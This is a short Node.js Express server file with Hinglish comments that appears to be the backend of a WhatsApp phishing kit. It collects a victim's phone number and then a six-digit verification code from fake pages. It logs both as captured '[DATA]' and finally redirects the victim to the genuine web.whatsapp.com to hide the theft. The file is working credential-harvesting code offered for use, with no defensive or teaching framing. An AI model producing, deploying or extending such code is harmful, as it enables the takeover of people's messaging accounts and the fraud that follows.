const express = require('express');
const path = require('path');
const app = express();

// Forms aur JSON data handle karne ke liye middlware
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Public folder ki files (CSS, Images) ko serve karna
app.use(express.static(path.join(__dirname, 'public')));

// MAIN HOME PAGE ROUTE (Yeh line 404 error khatam karegi)
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// VERIFY PAGE ROUTE (Jab user number submit kare to direct yeh page khule)
app.get('/verify.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'verify.html'));
});

// 1. Phone Number Receive Karne Ka Route
app.post('/submit-number', (req, res) => {
    const userPhone = req.body.phone;
    console.log(`[DATA] Phone Number: ${userPhone}`);
    res.redirect('/verify.html');
});

// 2. Verification Code Receive Karne Ka Route
app.post('/submit-code', (req, res) => {
    const code = `${req.body.c1}${req.body.c2}${req.body.c3}${req.body.c4}${req.body.c5}${req.body.c6}`;
    console.log(`[DATA] Verification Code: ${code}`);
    res.redirect('https://web.whatsapp.com');
});

module.exports = app;